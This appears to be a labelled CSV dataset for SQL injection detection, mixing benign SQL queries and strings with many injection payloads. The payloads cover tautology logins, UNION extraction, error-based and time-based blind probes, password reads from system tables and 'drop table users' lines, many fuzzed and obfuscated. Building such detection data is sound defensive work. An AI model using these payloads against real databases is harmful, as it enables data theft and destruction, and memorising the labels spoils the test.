Query,Label,cluster,stratify_col
"having
3b6b0b8Ã¢Â 	=?	6o0b1--",1,2,1_2
select * from customers  where city like '[!bsp]%',0,7,0_7
"7'$;)    or updatexml )(  0o0b11107010104,concat  (  0x0x5x0b0xae,9x0x0x8b0x0b810d0b9b1101110e0o0b111aa0o107, `(|@select   ( ?elt  (  5x0o0b0b111100010000101010001100101110	=2x780,0x0x0o10/*|g39y?`:(select (select 6)):f+_f&f*/>&)+? or false or false or false#	)     ) "",0x0x0b10cda767a0b0b1000111*;)  ,(select (select 0x0o25da))~)   |  [and  <> _or false/*_bifui[*/and	9x3  or  (select (select (select~0x946b)))!=(select (select 0x0xf0b111b))#/  ( `'beju' [like >'bejut~,sgg.1w",1,9,1_9
"  update paper set became =  'grabbed', city =  'anybody' where possible =  climate",0,5,0_5
' or '1'='1#fm5jp,1,9,1_9
3728910000000000,0,3,0_3
"0x9o7b0b0b0xex0o10o0o0o5b0b0b3b100901100110100110111x0o5x0x9']=)}:
as
bfgl)where-0b0x0o8o0b11o0b0o0o7x1o6x0o0x3cfc=0o2xbx3x0xbff<union/*pl~}(select)(select*(select[(select)(select{(select~(select	2)))))))j>$
!(t-`}xom;u*/all(select<null,null,null,null,null,null,null,null,null,null--",1,4,1_4
-4828%'  )   or 8678  =  5745#,1,6,1_6
"1/**/)=where@0o0b1000b0o90966:=[6o0b100111001100010;union@all
select
null,null--",1,0,1_0
"  select * from half where excitement in  ( 'neighbor', 'blanket', 'meant' )  ",0,5,0_5
'/*!12345*/and 1=1  || (1)--,1,6,1_6
"1'/*hsb*/where]0b110100100010""=!/3362",1,2,1_2
8695,0,3,0_3
select * from widely where standard between 'experience' and 'list',0,5,0_5
kri!sti,0,0,0_0
select distinct free from them,0,7,0_7
" select * from users
where id='9' or.@ @(select (select (select (select 1))))&/*s7;t*/=  1 union select (select (select 1)),version: (    )      and   '5' not like '0x7;' andtrue
or false'and ""&"" like ""&"" or false -- 1'a{3f",1,4,1_4
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   ""dros""  =  ""dros",1,4,1_4
"1%""   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1_1
" select *
from users where id+ like  0x0x1 or   (  \+  ) ;  like  (select;(select 1)) union select (select 0o1),@@version and/*:9d]*/true`or (select 6x0) and (select 0x1) -- 4q[xqd",1,4,1_4
"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""rdri""  =  ""rdri",1,4,1_4
select necessary from layers union select most from on order by power,0,7,0_7
"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",1,2,1_2
cancela arce,0,8,0_8
"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '",1,9,1_9
select pg_sleep  (  5  )   and    (    (     (  'qslr'  =  'qslr,1,4,1_4
select * from symbol where perfect = 'fellow' limit 3,0,5,0_5
delete from fully where memory = 'wonderful',0,5,0_5
-4428  )   or 3038  =  3038,1,6,1_6
"-9209%""   )    )     )   union all select 3736,3736,3736--",1,4,1_4
"1/*mle	*/and;char  (	 0x6d  )	  or char( ( Ã¢Â (select 0x9f)  )   or  char  (  0x46  )  ||char 
(  0x5a )/**/   =  regexp_substring {(  repeat  (^ right  (, char  (  (select 1x0o2578) :)@;,(select (select (select 0x4)))  )  ,0x12a075150! )  ,null  )    or   6x0 or~0x25d0b11 not like (select (select (select 9683))) and true and true  and *0x1or false  or  false and (select (select 1)) and (select 1) and true --",1,4,1_4
"' and extractvalue(1,concat(0x5c,version()))----wr05h6cvwnexe9",1,0,1_0
"0o0o3b2x5"">|;)  `;)?   ) Ã¢Â  and elt
 ($ 0b0b0b11045010110  like <3b0x1e0b0b11110110110101000010,(select((select 0x1dac))  )    &&  ,
 ( 
% (   	:(  ""qcro"" + like   ""qcro",1,2,1_2
"1'+% (~Ã¢Â select 'sfko' where 0x1aca <like  4855;rlike.sleep  (  5x5  ) /**/  and  (select 4446)=0x0o10536 or
(select/(select (select 0))) and[0x404 not like 1029 or 0x195c not like (select (select 6492)) or false or,false and "";ytq?""="";ytq?"" and true: or  false#rrb:;",1,4,1_4
"-6194"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,4,1_4
"1%'?:%);   ) `   && Ã¢Â   (  0xbcc like* (select:(select<(select (select 0o0o0o0b1000111011000110)))) *)! *0o10o0o0o0b19101011010001 and  ,?(    (  /*xka4p0gf?ov}fÃ¢Â */'%'='",1,9,1_9
" select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",1,4,1_4
"0o0x1' and+make_set $(? 0b14x20d7Ã¢Â [  like ;];0o2o0o28823,0x0x3ec3`){<?and'lnwe') =Ã¢Â 'lnwe",1,9,1_9
corota,0,8,0_8
"1  )   as khkv where,(select](select 2944))=0xb0b011110 and/ }(  select (select 0b10001101111111) from  (  select count  (  or false   &&   (select 1) or (select (select 1182))!=0b10010011110 and (select 3129)=(select!3129) or ""]""!=""]"" or false or false#*  )  ,concat  ($ 0x0b0b10010101001110100001110110001111001111001101100100010010001100000111100010a77,  (  select   (  elt  (  (select (select (select
0b10001111001111)))   like   0x0o4455,(select (select 7))   )    ) 
   )  ,0x727a867a71,floor@ (  rand  (  (select 0x0) )$ *0x2   )  _ )  `x from information_schema.character_sets group	by}x 
)  a  )  or (select 0)   or  ;(select (select 0))@and 0x12dc=0o0b10110001000110 --?i",1,4,1_4
vlahos,0,8,0_8
" select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",1,5,1_5
"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'cwjd'  =  'cwjd",1,9,1_9
16707,0,3,0_3
" select * from users where id  =  1 *$ . union select null,@@version -- 1",1,5,1_5
test%u0027/*!12345*/||%u0020(1=1)%u00271%u0027=%u00271%u0027%u0020--%u0020#urgfzoeabp5na,1,2,1_2
select * from choice where substance = 'youth' limit 3,0,5,0_5
"1%""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""%""  =  """,1,4,1_4
"1%u0027%u0020union%u0020select%u0020table_name,%u0020null,%u0020null%u0020from%u0020information_schema.tables%u0020----m5nsu5827f",1,2,1_2
"0b1""   )    )    and row  ({ (select 6217),7369  )  >  (  select count  (  *  )^ ,concat< (
 0x0b11011011000101110111210a70,  (, select 
 (  elt  (  (select (select (select 1846))) in ((select (select
0b11011001111)),0b0x6d2,(select 4747)),(select (select 9)) 
 )    )   . )
 ,0x717a767a71,flo  or    (  rand~>(  0  )  *(select 2)   )    )   x from   (  select (select 5192) union{select (select 2xec0x7) union select 0xf5b union;select (select 2x1bf6)  )  a group by;x  )   and    (    (   ""tbdl"" like`""tbdl",1,4,1_4
" end and    (    (   ""kvts"" like ""kvts",1,2,1_2
"' union select 1,2,3--#n1dzywczad43e",1,4,1_4
%u0027%u0020or%u0020exists(select%u00201%u0020from%u0020users)--,1,2,1_2
damas severiche,0,8,0_8
1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',1,9,1_9
"1' union/**/select/**/table_name, null,/**/null/**/from/**/information_schema.tables/**/--#6ynvsm",1,0,1_0
select * from customersfetch first 3 rows only,0,5,0_5
"   &&   (select (select (select (select 1))))  =  utl_inaddr.get_host_address  :(    (   select distinct  (  password *)   from ; (  select distinct  ( ^password  )  , rownum as limit from sys.user$  )   where limit  =  (select 0b0o0x4)   )    )    and 'i' =  'i",1,4,1_4
"select * from users where id,like (select (select (select 1))) %  (Ã¢Â @\> )   or(select 1) like 4 and 0o21514~like 6503  or  'gm'	notÃ¢Â like 'gm' or false or false or ""h""=""h,"" or (select (select 0)) and true  or  false --""5",1,2,1_2
"%u0027%u0020union%u0020select%u0020null,%u0020null,%u0020null%u0020--%u0020",1,2,1_2
"  select * from diameter where most not in  ( 'forget', 'does', 'know' )  ",0,5,0_5
"3 or+0o0x0o0b1101610301b_+like`!)}( ]select:count;;( *""')?[ from!sysusers_as/**/sys0b101b5b0b1111101000,sysusers as/**/sys0o2,sysusersas>sys3,sysusersas sys4,sysusers)as;sys0b0b8b2xc,sysusers}as:sys1b0b0b6o0o0b11110000010110101110100000,sysusersas/sys0o0o7]/**/)?.",1,2,1_2
elysha,0,8,0_8
' or exists(select 1 from users)--,1,4,1_4
"1'+  ( select<ocvc/*(select (select 1))[j w?*/where?0o2x0o3b45  %like>/?0x1b2x0b10d.union?allselect null,null,null,null,null,null,null,null,null,null{orÃ¢Â false  or  false or!(select 0x0x0x1d8b)<>0o0b0x0o24045b0o0b110000111010105011 or (select""648)*like 0o0x692[or false  or; false or0b11110180107!=0x7a5 orÃ¢Â (select;(select (select 0))) or false#>t~_&o.(uk=*s",1,2,1_2
"$select * fromusers where/**/id!like  0b1 + @`\` union	select 9b0o0o0o0b1,version  (	   )&   or   (select (select (select 4914))) not+likeÃ¢Â 0x1906 or false  &&  (select 1) -- 15l9qaf",1,2,1_2
" select * from users where id  =  '1' union select +\,@@version -- 1'",1,5,1_5
select * from sky where bar in  ( select asleep from balloon ) ,0,7,0_7
1'  )   where 6222  =  6222 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1,4,1_4
"' a/*!*/nd extractvalue(1,concat(0x5c,version()))--",1,0,1_0
select * from fly where nails = 'layers' fetch first 3 rows only,0,5,0_5
09352334m,0,3,0_3
"' union select 1,2,3----u4ix8",1,4,1_4
"1'   )    )    and make_set  (  3793  =  8118,8118  )   and    (    (   'swvc' like 'swvc",1,9,1_9
select count ( union )  from folks,0,1,0_1
"select * from forward where gravity between ""highway"" and    ""happened""",0,2,0_2
select option_value from wp_options where option_name  =  '_options_footer_button_2_text' limit 1,0,5,0_5
c/ calzada 169,0,0,0_0
"1   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  9184  =  9184",1,4,1_4
"0o2o1'+ {( `select zukr where 0x5x73ff^==  0x0x24ff!or char: (|,(select (select (select (select (select (select (select""0x16)))))))Ã¢Â !)|']or char +(\ 0x0o55  )   or char `(  97_:)   or char 
(;or false or false and (select 3693)=(select (select 3693)) and true and true#^0x75  )   =Ã¢Â regexp_substring  (//repeat  (  right.	(  charÃ¢Â  (  (select
0x185)  )  ,(select 2x0) +)  ,0o0o45001321020  ) >,null   )~   ) & +'ec4b=r",1,4,1_4
"0b1'  ))  where<(select 0b0x1dd8) like 	0b1110111011003 andÃ¢Â make_set `(?/*k8unw;g;2bysbyxn;7nh*/(select 8978)  like  0b10009110012010,0x0b100010010000  )   or; (select (select (select (select 0)))) or false and (select (select (select 5832))) not<like 0x0x10fb|and true --",1,4,1_4
"'          union          select          1,2,3----95meu0bq4",1,4,1_4
; select pg_sleep(5); --#sj42qgyb76jy,1,0,1_0
 update exercise set arm = 'location'where stove = 'organized',0,5,0_5
admin' or '1'	in (1) '1 /*!*/and 1	= 1,1,9,1_9
select test ( s )  from open full outer join,0,1,0_1
"'or
exists(select
1fromusers)--",1,4,1_4
"' and 1=convert(int,@@version)----yrqkhmd5ko",1,6,1_6
select system_user (  ) ,0,1,0_1
select 8 div 3,0,0,0_0
select distinct hollow from ordinary,0,7,0_7
select distinct typical from discover,0,7,0_7
"1""  )   where 5129  =  5129 order by 1--",1,6,1_6
"-6970""   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""dyrq"" like ""dyrq",1,4,1_4
"1' in;boolean
mode  )  or elt, (} 0x0b10000f0x4 like/*ns;@x*ell;c_{!v}b]j*/2x0o20f0b0b4x1,sleep  (  0x8x6]*:)""`?
)>     &&   true && true	or '2lz3' like
'6lz7x0x6/'  !and   (select~(select[0x1))  and( (select (selectÃ¢Â (select (select (select (select (select (select (select (select (select 1)))))))))))  and  true  &&  ' and ';d[hc'?not like ';d[hcs' or false#'!='##'#/\-brweg",1,9,1_9
"av. vicente mortes, 78, 8?f",0,0,0_0
"'unionselectnull,null,null or 'b'='b'--
",1,9,1_9
select top 50 percent * from hunter select * from kitchen fetch first 50 percent rows onlyselect top 3 * from fat,0,5,0_5
test%u0027/**/or%u0020%u00271%u0027=%u00271%u0027%u0020--%u0020,1,2,1_2
"1 )    ( >select  >(  case when&  ( ,(select (select;(select 0o8o0x51eb)))=(select 0x0o4xaaf) :)'@`then}regexp_substringÃ¢Â  (  repeat  ( left  ( $crypt_key> (  char&~(]Ã¢Â 0b0b5xf  )     or  |char{?(>{0x45  )_  or'char; ( ](select""3x13); )  ,null  )]\,(select 2x2)  )  ,0b0b1101111o8o3502374347 	)  ,null +) <?else char^ (` (select (select 0x4c))@	)]   or  char ;( _0o101  )   or!char+ ( ""2x2b8o8x126` )       or[
 ; char  (. 2b0b1101110o310~ )  !end@ )   from   (( values  (+ 0o5x8`_ ) ?  )     )  
  and     (  0x33eb  like/<0x13eb",1,4,1_4
millot_power@guejos.sv,0,0,0_0
admin' or '1'='1,1,9,1_9
select * from twelve where example = 'use'  and city = 'unless',0,5,0_5
"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1_1
-7164%' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  ',1,9,1_9
"1""  )   where 9020  =  9020 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,4,1_4
"select}dbms_pipe.receive_message  ( -chr) (  0b0o3o0x2b0o0x0x0x2a  )    ||  chr  (: (select (select (select (select 0x43))))~ ); || chr &(  0x5f ;)(  or\chr /*u*vcgud	Ã¢Â */(  0b0b0b1010111011011100101011100100111100101010100111001101001101011101001 	)  ,0x5. )   from[dual<  &&      (    (     (^/*l+k[_:(select|0x6)$_)bbp\(select (select 0x9))]`fir^yk*/""%""
 like  """,1,4,1_4
"1' or ascii(substring(database(), 1, 1)) > 100 --#jb4gjh7f",1,0,1_0
`(\ select<7x8x0b110x0o15df from pg_sleep. (	 (select 9x2)  >)~  _)^,1,2,1_2
select * from progress where east = 'probably'  and  ( diagram = 'usually' or fifth = 'tribe' ) ,0,5,0_5
1 && 1=1--82d807,1,6,1_6
"1' in boolean mode  )   union all select null,null--",1,4,1_4
select   (  case when   (  6961  =  7460  )   then 1 else 6961*  (  select 6961 from master..sysdatabases  )   end  )  --,1,4,1_4
"0x2""  ^) ;  )       or )  updatexml  (  (select(select (select (select (select~(select (select (select (select (select (select (select 1308)))))))))))),concat"" (  0b0x0x2e,0b0x0x9179706a71,% (  select   ( ,elt  (
 (select 0x1a98)=0x71a,0x1
{)    ) ,   )  ,0x717a0x2ffa0o6b1000411  )  ,(select (select (select 0x31b2)))^ )   and     (    (   ""umst""  like  ""umst",1,4,1_4
select * from task fetch first 3 rows only select top 50 percent * from house,0,5,0_5
select * from pink where string between 'land' and 'bat',0,5,0_5
select top 3 * from halfway select * from slide 3select * from desk,0,5,0_5
"1%u0027%u0020xor%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020--",1,2,1_2
"faus 195,",0,0,0_0
;%u0020drop table%u0020users;%u0020--,1,0,1_0
ca5r7211a,0,8,0_8
"admin'""or/*.pcge*/0x1
&=!
0x0b0o9x1>  and/
,0x5da in*((select (select[(select 1437))),0b8o0x59e,0x79f)&&""o""/not[=|""os""~and~0x9a8 <> 0x0o11a9or""(select	(select=(select 1611)))<>0x15f0b0  && >0x0o2604 not like 0x1413 or'false and?true or(select (select 0)) or false#jua6x8gi0o67=~\&[d4j",1,4,1_4
select * from next fetch first 50 percent rows only,0,0,0_0
"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",1,6,1_6
select   (  case when   (  1898  =  4705  )   then 1898 else 1/  (  select 0  )   end  )  --,1,4,1_4
"random_noise--
",1,0,1_0
"'    and    1	= convert(int,@@version)----bv7bcsk2hm1c5gk",1,6,1_6
"0o1o0b1001%""/*ysp*/.); }and	0o7o0o122751{%like (select0o0o0b10010010110000000)--",1,2,1_2
"-3954'   )    )    union all select 2417,2417--",1,4,1_4
select glad ( s )  from curious,0,1,0_1
"1  )   as tjwa where 1173  =  1173 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,4,1_4
"0x2x1  )  ! or  0o85500  =  like /*iq(<(select (select (select (select (select (select (select 6))))))):?*/(  'abcdefg',upper  (  hex ;(  randomblob  (;>(select/**/(select 0x21426780))/(select{0b100x7x6b4b1910)%  ) ;= )	     ),  )& /   and    true and('l`il'!='l` il_' or ""-p""""!= ""-p""\ or  0o0xe4a<>0xe4a  and ;true or false---4gg",1,2,1_2
1' and 7533  =  7533 and 'clqy' like 'clqy,1,9,1_9
"0b10011001110 ""! and: 0x0o0o9o1/**	x0x6ccjip*/ like/*(select 76)*/ (selectÃ¢Â (select:0x9))unionÃ¢Â allselect/""admin"", ""81dc9bdb52d4dc24036dbd8313ed965",1,2,1_2
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   '%'  =  '",1,4,1_4
shiomi@errebebe.ug,0,0,0_0
"%u0027%u0020union%u0020select%u0020null,%u0020null,%u0020null%u0020 or (1)--%u0020",1,2,1_2
waitfor delay '0:0:5' and    (    (     (  'ozjl' like 'ozjl,1,0,1_0
select * from spend where gas = 'weather'  and  ( research = 'rising' or mine = 'molecular' ) ,0,5,0_5
select count ( * )  as badly,0,1,0_1
"0o4b0x0x7
:	),   )\,[ ^)/and:true	andtrue or@false orfalse  or ;(select 1424)=(select 1425) or false#'
waitf
or% delay`'1o3b100:4b4x0o0o0x0o0o1o0x5x0o91x0x0x4:1b134'--+
g|(select^0x4)[zkoqruh3rbq_",1,2,1_2
"1""   )    )    as rfgu where 4880  =  4880 union all select null,null,null,null,null,null,null,null,null--",1,4,1_4
"1' and substring(database(), 1, 1) = 's' ----elpfeaypkq",1,9,1_9
"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",1,4,1_4
magalia,0,8,0_8
"1_ )   andÃ¢Â extractvalue  ($)0o8o0b0b11100101101001100101001011011100010100100010011010,concat ?(  0x0x5c,0x7171733a82, ;(  select { (  elt  (&-(select""(select (select'(select 0x0o1f0o5e))))_   like  /**/ 0b1111000000040,(select 2x1)  {))  ~) <   )  ,0b0o0x0b1000110111a0b1015111111a0b1000111 ! ) 	  )  ",1,2,1_2
"call regexp_substring  (  repeat  (  left  (  crypt_key"" (  char  (  (select (select (select 64)))  )    or  char '( <(select (select 0x45))  )   or char! (! (select 0x53)  )  ,null  )  ,(select (select (select 2)))  )  ,0b0x1dcd0o14544  )  ,null  )   &&    (   -(    	(  'vwxg'='vwxg",1,1,1_1
select * from station where stranger = 'afraid' limit 3,0,5,0_5
lareo robles,0,8,0_8
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 28797 )  order by meta_id asc",0,7,0_7
"1%'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  '%'  =  '",1,9,1_9
"1) union select 1,database(),3----9zocysxw07",1,4,1_4
 update particular set melted = 'hunter'where example = 'satellites',0,5,0_5
; drop table users;  or (1)--,1,0,1_0
"  select subtime ( ""10:24:21"", ""-3:2:5"" ) ;",0,0,0_0
1'+  (  select 'wpnm' where 8223  =  8223 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   +',1,9,1_9
"1' 	 )  
 )    or[(select (select (select 0b5b0b1110101100011001010011111000111010000000111110101110100101110111101111010111000111110011010100100100100111011110100000000000100001101)))= (( /**/select 0b0b0o165723242530723 from pg_sleep  (|=(select (select 0x5))   ) /*n(t9krgd*/ [)    and Ã¢Â   (    (   'cqwz' like 'cqwz",1,9,1_9
"-5581%'   )    )     )   union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",1,4,1_4
"0o0o0b4b0b0o1550/*p.z_qf-1xkz1g_*/? )/*|*/
 )) ;,} or[ pg_sleep](/*r
(select (select (select 7)))*/ __time__	)  or	(select 7x14a0b1001)like	0b1061010101010 or*false --",1,2,1_2
" select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1,5,1_5
"'				un/*!*/ion				select				1,2,3--",1,0,1_0
-5449' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'ryvy' like 'ryvy,1,9,1_9
"1) union select 1,database(),3----chxsuinbjx74",1,4,1_4
" select column_name ( s )  from happened,getting",0,1,0_1
*|,1,2,1_2
"1""   )    )     )   union all select null,null,null,null,null,null--",1,4,1_4
njar,0,8,0_8
"0o7o0b6%'	'])  < ) ,  :   or   /3o0x0o0o2o8x0o0x4xc0b0x0b1000b= {('select?count  ( ;*. )}/*:*(select (select (select (select&(select (select (select (select (select (select 2))))))))))thnw}j4*/@from sysibm.systablesas t0b0o7x1,sysibm.systables as!t2,sysibm.systables;as/**/t0b0b1510	`) ?(and:`{\(:   ( \ '%'	=""'",1,2,1_2
foto3rfico,0,8,0_8
"test'or'1'='1'/*#pti9r3f3r72b6sm/*
*/",1,9,1_9
nadav6,0,8,0_8
test'/**/or/**/'1'='1'/**//**/or/**/'b'='b'--/**/#pilgmo7,1,9,1_9
select * from wing order by control,0,7,0_7
select * from object where farm between '1996-07-01' and '1996-07-31',0,5,0_5
"cardenal mendoza s/n, 7?h",0,0,0_0
"   select chamber, tired+ ', ' + certain+ ' ' + crew+ ', ' + suit as broke  from face",0,5,0_5
select * from friend fetch first 3 rows only,0,0,0_0
"0b0b1'   ) ; $)     )^/*a*/ and 0x6870 >like    (= 'qqpjq' or  ^(  select case^(select (select (select (select (select (select (select (select 7280))))))))when (select 0o94140) then (select 0b0x1) else 0b3 end
from rdb$database  ) like   or  'qzvzq'  )]  and   ;(/   (    (  'bwka'  like  'bwka",1,9,1_9
select frighten ( s )  from test union,0,1,0_1
1'||  (  select 'tcfy' where 4546  =  4546 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',1,9,1_9
"1)/**/union select 1,database(),3--",1,0,1_0
5044890000000000,0,3,0_3
1  )   where 6725  =  6725 and 1553  =  7419,1,6,1_6
"c/ cardenal cisneros 70, 12?d",0,0,0_0
27002424x,0,3,0_3
7912640000000000,0,3,0_3
"2o0b0o4%"" + )   +)     or^ 0x05ec= ~(  select[count  ( +*;/**/)   from sysusers/*uqzgf)c4~qjgl*/as
sys6,sysusers as
sys0b76,sysusers as$sys7,sysusers as sys2,sysusers as@sys5,sysusers as(sys0b110o8x5,sysusers as sys5o3  )  and	true\or,false) and  true (and  true=and trueÃ¢Â and (select<(select (select 0x8x0b0o1))) and}true && true  ||  (select (select (select\0o0))) or (select (select (select 5784)))?<> (select
(select (selectÃ¢Â 0x1698))) and true and (select 1) or false or false and true and;1 or false --",1,2,1_2
enero,0,8,0_8
"1""""){,/**/where}0x0b0b1001000110000100111010000001111000100101101010$@=/*='m4*/}0x2445-and\0b10020100111010/**/	={(select 0b10050010010111).and\(select&1) and 1#]_",1,2,1_2
selectÃ¢Â sleep;?(  0o0o10o0b0x0x8()/  and('beuk'  like  'beuk,1,2,1_2
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",1,1,1_1
admin'or'1'='1,1,9,1_9
select * from perfectly where describe = 'fairly' fetch first 3 rows only,0,5,0_5
j0ctar,0,8,0_8
"1'     or  > *0x0o0o4340  like  benchmark (\	(selectÃ¢Â 0x4c4b40),md0x5~( 0b101x0b0b111100001101010000111010011110a0b1007010901001   )_> {)+/**/	",1,2,1_2
"6  or    (  select<*from   (  select (* sleep
 (  (select (select 1x0x5b111)) [ )  Ã¢Â  )     ) /*zq!c*o4wx-6aul*/ydpu )  and 'b{' ( not =   'b{|' or false or-false or""false or (select (select (select (select 0)))) or false or false or false or false --^paxv",1,4,1_4
'     or     1	=	1     --     #kxn51slvk,1,6,1_6
"
select * from users%where id  like  0x5  or  ""  )
 7"" or (select (select 3)) ^=}<(select (select 0x5)) or false -- 4xddz",1,4,1_4
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  5   )    )    and 'i'  =  'i",1,4,1_4
-8625 or 3176  =  2519# fvgl,1,6,1_6
from  ( select distinct rhyme from around ) ,0,7,0_7
select * from mill,0,5,0_5
delete from door where grow = 'small',0,5,0_5
"carlos arniches 78,",0,0,0_0
reinazgo,0,8,0_8
45025499d,0,3,0_3
select * from exclaimed where heading not between 'muscle' and 'continued',0,5,0_5
1'  )   as ulbr where 7233  =  7233 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,4,1_4
arrazua-ubarrundia,0,0,0_0
"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""ghdr"" like ""ghdr",1,4,1_4
"coslada 83, 4g",0,0,0_0
"caada de los ingleses, 117,",0,0,0_0
"1%""   )    ) 	   ) }  and `make_set  (  0x0b10100d3  like  0x20d3,0b0b0b11100101110100011000000010111010000000000111101100011010011011010010010111111100101100111001102011010100111010001011100010110001110011010110011  )   and 
	 (""   (}  ~(` ""%""  =	 """,1,2,1_2
"1   )    )    as tuxy where 6855  =  6855 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1_1
" select * from promised order by there, bet",0,7,0_7
select * from hurried where won like '%child%',0,7,0_7
